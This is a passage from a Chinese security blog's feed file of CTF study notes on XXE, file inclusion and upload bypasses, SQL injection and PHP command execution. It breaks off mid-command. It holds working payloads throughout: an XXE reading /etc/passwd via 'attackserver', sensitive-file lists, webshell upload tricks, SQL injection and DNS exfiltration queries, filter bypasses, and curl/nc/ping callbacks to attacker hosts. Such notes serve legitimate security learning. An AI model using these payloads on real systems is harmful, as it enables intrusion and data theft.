区段（CDATA section）中的文本会被解析器忽略。<br>&lt;![CDATA[ ANYTHING_HERE ]]&gt;</p><p><img src="https://bu.dusays.com/2022/04/06/3cd60f4b35e35.png"></p><p>提交</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE root [ &lt;!ENTITY % content SYSTEM "file:///etc/passwd"></span>&lt;!ENTITY % dtd SYSTEM "http://attackserver/readillegal.dtd"%dtd; ]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>&amp;filecontent;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>参考链接：<a href="http://github.com/leezp/xxe-study">http://github.com/leezp/xxe-study</a><br>例题：<a href="https://github.com/nreusch/writeups/blob/master/m0lecon_2020/skygenerator.md">M0lecon-ctf-2020-skygenerator</a></p>]]></content>
      
      
      <categories>
          
          <category> 注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含&amp;上传</title>
      <link href="/2021/09/29/wen-jian-bao-han-shang-chuan/"/>
      <url>/2021/09/29/wen-jian-bao-han-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ul><li>引用本站&#x2F;外站文件的某个功能点</li><li>找到传递的参数（get、post），查看其是否有包含关系</li></ul><span id="more"></span><h2 id="漏洞类别"><a href="#漏洞类别" class="headerlink" title="漏洞类别"></a>漏洞类别</h2><p>本地文件包含<br>远程文件包含，开启allow_url_open()</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>包含某段php代码，得到webshell</li><li>读取关键的配置文件、敏感信息</li></ul><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>远程文件包含：http:&#x2F;&#x2F;服务器&#x2F;shell.txt<br>无服务器：u&#x3D;secsecsecsecsec&amp;p&#x3D;123”;i:1;s:4:”eval”;i:2;s:5:”admin”,}</p><p>常见敏感文件路径</p><pre class=" language-text"><code class="language-text">Windows:c:\boot.ini  //查看系统版本c:\windows\system32\inetsrv\MetaBase.xml  //IIS配置文件c:\windows\repair\sam  //存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini  //MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD  //MySQL root密码c:\windows\php.ini  //php 配置信息Linux/Unix:/etc/passwd  //账户信息/etc/shadow  //账户密码文件/usr/local/app/apache2/conf/httpd.conf  //Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf  //虚拟网站配置/usr/local/app/php5/lib/php.ini  //PHP相关配置/etc/httpd/conf/httpd.conf  //Apache配置文件/etc/nginx/nginx.conf  //Nginx配置文件/etc/my.conf  //mysql配置文件</code></pre><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h2><ul><li>关闭浏览器的JavaScript</li><li>先上传允许的文件，再用burp抓包，修改文件数据等</li></ul><h2 id="content—Type绕过"><a href="#content—Type绕过" class="headerlink" title="content—Type绕过"></a>content—Type绕过</h2><ul><li>生成图片马上传     copy 1.jpg&#x2F;b + 2.txt&#x2F;a shell.jpg</li><li>burp抓包，修改http头的content—Type</li></ul><h2 id="文件后缀黑名单绕过"><a href="#文件后缀黑名单绕过" class="headerlink" title="文件后缀黑名单绕过"></a>文件后缀黑名单绕过</h2><ul><li>使用php3、php4、php5、php7、pht、phtml等后缀</li><li>上传.htaccess文件（存放apache服务器的配置文件）</li></ul><p><img src="https://bu.dusays.com/2022/04/06/a1a8a2bf6a7e8.png"></p><ul><li>上传.user.ini文件，auto_prepend_file&#x3D;1.gif   所有的php文件都包含1.gif<br>更多：<a href="https://blog.csdn.net/qq_36374896/article/details/107005123">https://blog.csdn.net/qq_36374896/article/details/107005123</a></li><li>Windows大小写不敏感绕过</li><li>文件后缀.(点) (空格)绕过<br>  Windows中，对于文件名中空格会被作为空处理，文件最后一个点会被自动去除</li><li>Windows文件流绕过<br>  上传的文件名中test.php::$DATA，会生成test.php文件<br>  — 双写绕过（php代码替换为空）<h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2>上传的文件会被删除，文件内容为写入一句话木马，在删除前访问上传的文件，执行一次，生成一句话木马文件（这个文件不会被删）。</li></ul><h1 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h1><h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><p>构造一个asp的一句话木马图片</p><ol><li>上传修改后缀为asa</li><li>test.asp;.jpg 将当做asp进行解析</li><li>test.asp&#x2F;123.jpg，系统会把5.asp当成一个文件夹，而这个子文件夹里的文件会当成asp解析</li></ol><h2 id="apache2-2-15解析漏洞"><a href="#apache2-2-15解析漏洞" class="headerlink" title="apache2.2.15解析漏洞"></a>apache2.2.15解析漏洞</h2><p>从右到左解析后缀，test.php.png及.php.jpg、.php.gif等均会被解析成php文件执行</p><h2 id="Nginx-CGI解析漏洞"><a href="#Nginx-CGI解析漏洞" class="headerlink" title="Nginx CGI解析漏洞"></a>Nginx CGI解析漏洞</h2><p>上传1.jpg，浏览器中访问1.jpg&#x2F;.php就可以成功执行php</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> 文件包含&amp;上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 文件包含&amp;上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2021/09/08/sql-zhu-ru/"/>
      <url>/2021/09/08/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>​    本文是对sql注入的总结和回顾,本文的sql语句（无特别描述的）都是基于MySQL数据库的。</p><h2 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h2><p>​    Sql注入允许攻击者扰乱对数据库的查询，从而让攻击者查看到正常情况下看不到的数据，甚至删除或修改这些数据。</p><span id="more"></span><h2 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h2><ol><li><p>按注入形式分</p><ul><li>联合注入</li><li>报错注入</li><li>盲注<ul><li>布尔注入</li><li>时间注入</li></ul></li><li>dns注入</li><li>堆叠注入</li><li>宽字节注入</li></ul></li><li><p>按注入点分</p><ul><li>get注入</li><li>post注入</li><li>cookie注入</li><li>header注入</li></ul></li></ol><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>length(string)</td><td>返回string的长度</td></tr><tr><td>substr(string,start_position,length)</td><td>可以从start_position位置开始，取长度为length的子字符串，</td></tr><tr><td>left(string,length)</td><td>取最左边的length个字符</td></tr><tr><td>right(string,length)</td><td>取最右边的length个字符</td></tr><tr><td>concat(str1,str2,……)</td><td>将多个字符串连接成一个字符串。</td></tr><tr><td>ascii(char)</td><td>获取字符的ascii码，如果是要给字符串那么就取第一个字符的</td></tr><tr><td>char(num)</td><td>将ascii码转换为字符。为介于 0 和 255 之间的整数。</td></tr><tr><td>nchar(integer_expression)</td><td>将unicode编码转换为字符。为介于 0 和 255 之间的整数。</td></tr><tr><td>sleep(second)</td><td>延迟多少秒。</td></tr><tr><td>if(expr1,expr2,expr3)</td><td>其实准确来说这是一个表达式。如果expr1成立就返回expr2，否则就返回expr3。</td></tr><tr><td>updatexml(需要替换的xml文档，xpath路径，替换内容)</td><td>通过xpath路径在需要替换的文档中进行定位，然后替换成替换内容</td></tr><tr><td>extractvalue(目标xml文档，xml路径)</td><td>对XML文档进行查询的函数，可以用来进行报错注</td></tr></tbody></table><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>​    在介绍union注入之前，先介绍下union查询，union的作用是将两个SQL语句进行联合。<br>例如</p><pre class=" language-mysql"><code class="language-mysql">SELECT a,b FROM table1 UNION SELECT c,d FROM table2</code></pre><p>union的查询需要满足两个条件</p><ul><li>每个查询都需要返回相同的列数</li><li>每列中的数据类型在各个查询之间必须兼容（NULL值可以和任何数据类型兼容）</li></ul><p>因此在union注入之前我们得先得到表的列数有两种方法<br>第一种是利用order by子句，从1开始自增直至报错,然后确定回显点</p><pre class=" language-mysql"><code class="language-mysql">' union select 1,2,3 --  （假设是3列）</code></pre><p>第二种是在union查询中设置不同数量的NULL值字段，直到不报错，然后再测试是啥类型的数据，一列一列的尝试直到收到正常响应，即代表那个位置是可以存放字符串的,例如我们可以这样构造payload：</p><pre class=" language-mysql"><code class="language-mysql">' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- </code></pre><p>接下来就是获取数据了,这里利用<a href="https://www.cnblogs.com/lyftest/p/8034470.html">information_schema数据库</a><br>获取所有数据库</p><pre class=" language-mysql"><code class="language-mysql">' union select 1,schema_name,3 from information_schema.schemata #</code></pre><p>获取某一数据库的所有表</p><pre class=" language-mysql"><code class="language-mysql">' union select 1,table_name,3 from information_schema.tables where table_schema='ku_ming'#</code></pre><p>获取某一数据库的某一张表的所有字段名</p><pre class=" language-mysql"><code class="language-mysql">' union select 1,column_name,3 from information_schema.columns where table_schema='ku_ming' and table_name='biao_ming' #</code></pre><p>接下来直接查询想要的数据就可以了</p><p>在我们需要将多列结果返回成一列时可以这样构造payload</p><pre class=" language-mysql"><code class="language-mysql">' UNION SELECT username || '~' || password FROM users-- </code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>平时我们最常用到的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。</p><p>流程，这里以updatexml为例</p><p>判断是否可以报错注入</p><pre class=" language-mysql"><code class="language-mysql">'and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+//0x7e是~ 的16进制ASCII码，id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));//extractvalue()从目标xml中返回包含所查询值的字符串id=1 and exp(~(select * from(select user())a));//当传递一个大于709的值时，函数exp()就会引起一个溢出错误id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);floor()是MySQL的一个取整函数</code></pre><p>之后的注入只要修改select user() 语句就行了</p><p>更多报错方法移步移步<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a><br>还有一种触发报错的姿势</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是啥？就是你看不到注入的结果，只能通过页面返回的区别来区分</p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><pre class=" language-mysql"><code class="language-mysql">'and '1'='1'and '1'='2</code></pre><p>例如通过这两个语句一般就可以得到它不同的响应，再根据区别写脚本，或用bp去爆破<br>具体可以看这里<a href="https://www.anquanke.com/post/id/245532#h3-28">https://www.anquanke.com/post/id/245532#h3-28</a></p><p>当返回结果无论如何都一样时，这时可以用时间注入。</p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>举例</p><pre class=" language-mysql"><code class="language-mysql">1' and (if(ascii(substr(database(),1,1))>100,sleep(10),sleep(4))  --+ </code></pre><p>根据页面的返回时间来判断</p><h3 id="dns注入"><a href="#dns注入" class="headerlink" title="dns注入"></a>dns注入</h3><p>在大多数应用系统，都会允许dns流量的出入，所以我们可以利用DNS流量将注入结果发送到我们外部网络的接收客户端。<br>此注入需要有个dns域名，我们可以用burp内的Burp Collaborator工具，或者dnslog等<br>举例</p><pre class=" language-mysql"><code class="language-mysql">and (select load_file(concat('//',(select database()),'.xxxxxxxx.ceye.io/abc')))</code></pre><p>漏洞限制<br>限制在windows系统，因为原理是利用了load_file在windows中读取文件利用到了资源管理器（可能不准确，未具体研究，但是能和资源管理器进行相同一个DNS查询操作，这个官方文档中并未提及）<br>在mysql5.5.53之前，参数secure_file_priv一直是为空可以任意进行读取，在我的测试中，之后的mysql版本已经对此有所限制（目录限制，没法随意读取文件）<br>漏洞的利用点不一定停留在数据库（更不限于mysql），如果你能换起windows的资源管理器，就可以成功利用这个dns通道查询传输信息</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>通过;分隔来执行多条语句<br>一般如果要使用到堆叠注入的话，select都已经被屏蔽了。如果没有屏蔽直接使用select语句进行查询就是了。接下来重点说在各种屏蔽的情况下怎么绕过</p><ul><li>预编译</li></ul><pre class=" language-mysql"><code class="language-mysql">-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#拆开看：    set @sql = CONCAT('se','lect * from `1919810931114514`;');        通过concat来讲select拼接，以绕过过滤，然后讲破解的字符串赋值给了变量@sql    prepare stmt from @sql;        将@sql编译了之后的结果给stmt。    EXECUTE stmt;#        运行编译后的结果流程：拼接sql语句->编译sql语句->运行编译后的结果</code></pre><ul><li>偷梁换柱</li></ul><pre class=" language-mysql"><code class="language-mysql">1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#表 words是我们访问页面时默认正常访问的数据表表 1919810931114514是存放flag的数据表alter table words rename to words1;     那么我们直接将words重命名为其它表alter table `1919810931114514` rename to words;     然后将1919810931114514表命名为words不就是了。这样一来我们正常输入数据的时候直接是访问1919810931114514里面的数据了。alter table words change flag id varchar(50);#    当然我们还要将1919810931114514里的字段名也改为words的字段名才行。将字段名flag改为id当然如果之前是通过提交1或在2这样的数字来获取值的。现在这里面的类型变了。所以我们得使用1' or 1=1#使得无论无何都返回第一条数据。</code></pre><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>参考资料：<a href="https://blog.csdn.net/weixin_43264067/article/details/105945059">宽字节注入</a><br>原理：由于魔术引号函数的存在magic_quotes_gpc(开关)，会自动在’ “ \等前面加上一个\导致sql语句闭合不了，这时候我们就需要输入一些字符，让数据库实现误判，让转义字符\和我们输入的语句组成一个新的汉字来闭合语句。</p><p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符，也可宽字节绕过，防御设置编码为gbk，Mysql_set_charset(‘gbk’,’$conn’)</p><p>注意：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御宽字节漏洞。<br>Mysql_query(“SET character_set_connection&#x3D;gbk,character_set_result&#x3D;gbk,character_set_client&#x3D;binary”,$conn);</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre class=" language-php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/select|union/'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>正则不区分大小写,大小写穿插绕过</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><pre class=" language-php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/select|union/i'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>正则匹配到select或union则替换为空，只会进行一次替换，可以双写绕过</p><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="#被过滤"></a>#被过滤</h3><p>用–+、– 、&#96;、;、&#x2F;**&#x2F;</p><h3 id="x3D-被过滤"><a href="#x3D-被过滤" class="headerlink" title="&#x3D;被过滤"></a>&#x3D;被过滤</h3><p>用like、rlike、regex</p><h3 id="被过滤-1"><a href="#被过滤-1" class="headerlink" title=",被过滤"></a>,被过滤</h3><p>无法替换，用其他函数来绕过</p><pre class=" language-mysql"><code class="language-mysql">union select 1,2#等价于union select * from (select 1)a join (select 2)b#同理(select 2)b 等效于select 2 as bselect * from users limit 0,1#等价于select * from users limit 1 offset 0#and ascii(mid((database()),1,1))=1#等价于and ascii(mid((database())from 1 for 1))=1#   使用substr和mid可以用这个来绕过</code></pre><h3 id="引号被过滤"><a href="#引号被过滤" class="headerlink" title="引号被过滤"></a>引号被过滤</h3><p>使用十六进制</p><pre class=" language-mysql"><code class="language-mysql">select column_name  from information_schema.tables where table_name=0x7573657273  # "users" 的十六进制为 0x7573657273</code></pre><h3 id="sleep-过滤"><a href="#sleep-过滤" class="headerlink" title="sleep()过滤"></a>sleep()过滤</h3><p>用benchmark()函数代替<br>benchmark()重复执行前面一个表达式</p><pre class=" language-mysql"><code class="language-mysql">id=1' and benchmark(1000000000,1)#    不知道前一个表达式的执行时间，所以要反复调整，改0的个数就行</code></pre><h3 id="substr过滤"><a href="#substr过滤" class="headerlink" title="substr过滤"></a>substr过滤</h3><p>用substring()和mid()函数代替</p><pre class=" language-mysql"><code class="language-mysql">id=1' and substring(database(),1,1)='d'#</code></pre><p>也可以用left()和right()</p><h3 id="逻辑运算符绕过"><a href="#逻辑运算符绕过" class="headerlink" title="逻辑运算符绕过"></a>逻辑运算符绕过</h3><p>一般情况，and、&amp;&amp;、or、||、xor只要有一个没有被禁用我们就可以用来判断注入点</p><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>用双空格、&#x2F;**&#x2F;、使用括号、用回车代替、tab代替、括号、url编码(burp抓包改空格为%a0)</p><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p>穿插内联注释符、用 show + 堆叠注入来查询、<br>用 handler + 堆叠注入来查询——handler biao open;handler biao read [first|next|prev|last];handler biao close;</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><p>您可以将多个字符串连接在一起以形成单个字符串。</p><table><thead><tr><th>数据库</th><th>表达式</th></tr></thead><tbody><tr><td>Oracle</td><td>‘foo’||’bar’</td></tr><tr><td>Microsoft</td><td>‘foo’+’bar’</td></tr><tr><td>PostgreSQL</td><td>‘foo’||’bar’</td></tr><tr><td>MySQL</td><td>‘foo’ ‘bar’ [注意两个字符串之间的空格] <br />CONCAT(‘foo’,’bar’)</td></tr></tbody></table><h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><table><thead><tr><th>数据库</th><th>表达式</th></tr></thead><tbody><tr><td>Oracle</td><td>SUBSTR(‘foobar’, 4, 2)</td></tr><tr><td>Microsoft</td><td>SUBSTRING(‘foobar’, 4, 2)</td></tr><tr><td>PostgreSQL</td><td>SUBSTRING(‘foobar’, 4, 2)</td></tr><tr><td>MySQL</td><td>SUBSTRING(‘foobar’, 4, 2)</td></tr></tbody></table><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><table><thead><tr><th>数据库</th><th>表达式</th></tr></thead><tbody><tr><td>Oracle</td><td>–comment</td></tr><tr><td>Microsoft</td><td>–comment <br />&#x2F;*comment*&#x2F;</td></tr><tr><td>PostgreSQL</td><td>–comment <br />&#x2F;*comment*&#x2F;</td></tr><tr><td>MySQL</td><td>#comment <br />– comment [注意双破折号后面的空格] <br />&#x2F;*comment*&#x2F;</td></tr></tbody></table><h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h3><table><thead><tr><th>数据库</th><th>表达式</th></tr></thead><tbody><tr><td>Oracle</td><td>SELECT banner FROM v$version <br />SELECT version FROM v$instance</td></tr><tr><td>Microsoft</td><td>SELECT @@version</td></tr><tr><td>PostgreSQL</td><td>SELECT version()</td></tr><tr><td>MySQL</td><td>SELECT @@version</td></tr></tbody></table><h3 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h3><table><thead><tr><th>数据库</th><th>表达式</th></tr></thead><tbody><tr><td>Oracle</td><td>SELECT * FROM all_tables <br />SELECT * FROM all_tab_columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td></tr><tr><td>Microsoft</td><td>SELECT * FROM information_schema.tables <br />SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td></tr><tr><td>PostgreSQL</td><td>SELECT * FROM information_schema.tables <br />SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td></tr><tr><td>MySQL</td><td>SELECT * FROM information_schema.tables <br />SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td></tr></tbody></table><p>还有许多附上链接了</p><p>链接：<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>]]></content>
      
      
      <categories>
          
          <category> 注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md语法</title>
      <link href="/2021/08/27/md-yu-fa/"/>
      <url>/2021/08/27/md-yu-fa/</url>
      
        <content type="html"><![CDATA[<p>​</p><blockquote><p>支持平台：微信公众号。<br>​<br>支持注音符号，用法如下：<br>​<br>Markdown Nice 这么好用，简直是{喜大普奔|hē hē hē hē}呀！</p></blockquote><span id="more"></span><p>​</p><h3 id="3-6-横屏滑动幻灯片"><a href="#3-6-横屏滑动幻灯片" class="headerlink" title="3.6 横屏滑动幻灯片"></a>3.6 横屏滑动幻灯片</h3><p>​</p><blockquote><p>支持平台：微信公众号。<br>​<br>通过<code>&lt;![](url),![](url)&gt;</code>这种语法设置横屏滑动滑动片，具体用法如下：<br>​<br>&lt;<img src="https://my-wechat.mdnice.com/mdnice/%E8%93%9D1_20191109174052.jpg" alt="蓝1">,<img src="https://my-wechat.mdnice.com/mdnice/%E7%BB%BF2_20191109174052.jpg" alt="绿2">,<img src="https://my-wechat.mdnice.com/mdnice/%E7%BA%A23_20191109174052.jpg" alt="红3">&gt;<br>​</p></blockquote><h2 id="4-其他语法"><a href="#4-其他语法" class="headerlink" title="4 其他语法"></a>4 其他语法</h2><p>​</p><h3 id="4-1-HTML"><a href="#4-1-HTML" class="headerlink" title="4.1 HTML"></a>4.1 HTML</h3><p>​<br>支持原生 HTML 语法，请写内联样式，如下：<br>​<br><span style="display:block;text-align:right;color:orangered;">橙色居右</span><br><span style="display:block;text-align:center;color:orangered;">橙色居中</span><br>​</p><h3 id="4-2-UML"><a href="#4-2-UML" class="headerlink" title="4.2 UML"></a>4.2 UML</h3><p>​<br>不支持，推荐使用开源工具<code>https://draw.io/</code>制作后再导入图片<br>​<br>​</p><h2 id="5-致谢"><a href="#5-致谢" class="headerlink" title="5 致谢"></a>5 致谢</h2><p>​</p><ul><li>编程如画 <a href="https://github.com/mdnice/markdown-nice" title="插件原作者">markdown-nice-docs</a></li><li>歌词经理 <a href="https://github.com/lyricat/wechat-format" title="灵感来源">wechat-fromat</a></li><li>颜家大少 <a href="http://md.aclickall.com/" title="MdA2All">MD2All</a><br>​<br>​</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php代码命令执行</title>
      <link href="/2021/08/24/php-dai-ma-ming-ling-zhi-xing/"/>
      <url>/2021/08/24/php-dai-ma-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="代码命令执行常用函数"><a href="#代码命令执行常用函数" class="headerlink" title="代码命令执行常用函数"></a>代码命令执行常用函数</h2><p>代码&#x2F;命令执行攻击中，Web服务器没有过滤类似system(),eval(),exec()等函数的传入参数是造成漏洞攻击成功的最主要原因。</p><span id="more"></span><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>${php代码}</td><td></td><td>${phphinfo();}</td></tr><tr><td>mixed eval(string $code)</td><td>把字符串code作为php代码执行</td><td>eval(‘phpinfo();’);</td></tr><tr><td>bool assert(mixed $assertion[,string $description])</td><td>assert()会检查指定的assertion并在结果为FALSE时采取适当的响应。如果assertion是字符串,它将会被assert()当做PHP代码来执行。</td><td>assert(‘system(“whoami”)’);</td></tr><tr><td>mixed preg_replace(mixed $pattern, mixed $replacement , mixed $subject [, int $limit&#x3D;-1 [, int &amp;$count ]])</td><td>搜索subject中匹配pattern的部分，以replacement进行替换。当$pattern处存在e修饰符时(5.5.0版本&#x2F;e 修饰符已经被弃用了)，$replacement 会被当做php代码执行。</td><td>preg_replace(“&#x2F;test&#x2F;e”,”system(‘whoami’)”,’test’);</td></tr><tr><td>mixed call_user_func (callable $callback [, mixed $parameter [, mixed$… ]] )</td><td>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。传入ca11_user_func()的参数不能为引用传递。</td><td>call_user_fun(‘system’,’whoami’);</td></tr><tr><td>mixed call_user_func_array (callable $callback，array $param_arr )</td><td>把第一个参数作为回调函数(callback) 调用，把参数数组(param_arr)作为回调函call数的的参数传入。</td><td>call_user_func_array(‘system’,array(‘whoami’));</td></tr><tr><td>string create_function(string $args,string $code)</td><td>在php中使用create_function()创建一个匿名函数(lambda-style),如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行</td><td>create_function(“$test”,”};phpinfo();&#x2F;*”);</td></tr><tr><td>array array_map(callable $callback,array $array1 [,array $…])</td><td>为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。</td><td>array_map(“system”,array(“whoami”));</td></tr><tr><td>array array_filter(array $array [,callable $callback [,int $flag &#x3D; 0]])</td><td>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</td><td>array_filter(array(“whoami”),”system”);</td></tr><tr><td>bool usort( array &amp;$array,callable $value_compare_func)</td><td>通过用户自定义的比较函数对数组进行排序。</td><td>$a&#x3D;array(“whoami”,”t”);<br />usort($a,”system”);</td></tr><tr><td>bool uasort(array &amp;$array,callable $value_compare_func)</td><td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。</td><td>$a&#x3D;array(“whoami”,”t”);<br />uasort($a,”system”);</td></tr><tr><td>string system(string $command [,int &amp;$return_var ])</td><td>command是要执行的命令。如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出。</td><td>system(“whoami”);</td></tr><tr><td>void passthru(string $command [,int &amp;$return_var ])</td><td>执行外部程序并显示原始输出</td><td>passthru(“whoami”);</td></tr><tr><td>string exec(string $command [,array &amp;$output [,int &amp;$return_var ]])</td><td>执行所指定的命令，并返回结果的最后一行内容，不显示输出</td><td>echo exec(“whoami”);</td></tr><tr><td>string shell_exec(string $cmd)</td><td>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</td><td>ehco shell_exec(“whoami”);</td></tr><tr><td>void pcntl_exec(string $path [,array $args [,array $envs ]])</td><td>path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本，args是一个要传递给程序的参数的字符串数组。该模块不能再非Unix平台（Windows）下运行。</td><td>pcntl_exec(“&#x2F;bin&#x2F;cat”,array(“&#x2F;etc&#x2F;passwd”));</td></tr><tr><td>resource popen(string $command,string $mode)</td><td>打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。后面的mode，当为’r’，返回的文件指针等于命令的STDOUT，当为’w’，返回的文件指针等于命令的STDIN。</td><td>$handle&#x3D;popen(“&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd”,”r”);<br />$read&#x3D;fread($handle,4096);<br />echo $read;<br />pclose($handle);</td></tr><tr><td>反引号</td><td></td><td>echo `whoami`;</td></tr></tbody></table><p><img src="https://bu.dusays.com/2021/09/13/908df4ec7a4b1.png" alt="create_function"></p><p><img src="https://bu.dusays.com/2021/12/06/cbdfc717149fd.png" alt="proc_popen&amp;ob_start"></p><h2 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h2><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><ul><li><p>延迟<br>?cmd&#x3D;sleep 5</p></li><li><p>http请求<br>公网ip监听   nc -lvp 4444<br>curl命令    ?cmd&#x3D;curl ip:4444</p></li><li><p>dns请求<br>dns      ?cmd&#x3D;ping xxxxxxx.ceye.io</p></li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li><p>使用 &gt; 或 &gt;&gt;  (有写权限)<br>?cmd&#x3D;cat flag.php&gt;flag.txt  </p></li><li><p>mv 或 cp      (有写权限)<br>?cmd&#x3D;mv flag.php flag.txt<br>?cmd&#x3D;cp flag.php flag.txt   </p></li><li><p>打包压缩      (有写权限)</p><ul><li>tar打包或tar打包并压缩<br>tar cvf flag.tar flag.php<br>tar zcvf flag.tar flag.php</li><li>zip压缩<br>zip flag.zip flag.php</li></ul></li><li><p>cut and sleep<br>sed指定读取文件的第几行<br>cat flag.php | sed -n ‘2p’   <a href="https://www.cnblogs.com/sysk/p/4689575.html">sed用法</a><br>提取每一行的第3个字节<br>cut -b 3 flag.php<br>最后<br>cat flag.php | sed -n 